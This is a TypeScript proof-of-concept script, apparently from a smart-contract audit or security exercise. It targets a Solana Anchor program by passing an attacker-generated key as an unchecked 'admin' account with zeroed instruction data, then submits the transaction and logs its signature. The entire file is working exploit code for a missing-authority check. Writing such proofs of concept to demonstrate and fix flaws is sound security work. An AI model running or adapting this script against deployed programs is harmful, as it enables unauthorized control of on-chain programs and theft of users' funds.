import * as anchor from "@coral-xyz/anchor";
import { PublicKey, Keypair, Transaction, TransactionInstruction } from "@solana/web3.js";

async function main() {
  const provider = anchor.AnchorProvider.env();
  anchor.setProvider(provider);

  const programId = new PublicKey("QB7FhB7nRdL18x8teKV5LsiYCP8YnduXZUVye4kfoWr");

  const arbitraryAdmin = Keypair.generate().publicKey; // attacker-controlled unchecked account

  const ix = new TransactionInstruction({
    programId,
    keys: [
      { pubkey: arbitraryAdmin, isSigner: false, isWritable: false },
    ],
    data: Buffer.alloc(8), // rely on Anchor discriminator matching first 8 bytes of zero for this demo
  });

  const tx = new Transaction().add(ix);
  const sig = await provider.sendAndConfirm(tx, []);

  console.log("POC_TX:", sig);
}

main().catch((e) => {
  console.error(e);
  process.exit(1);
});
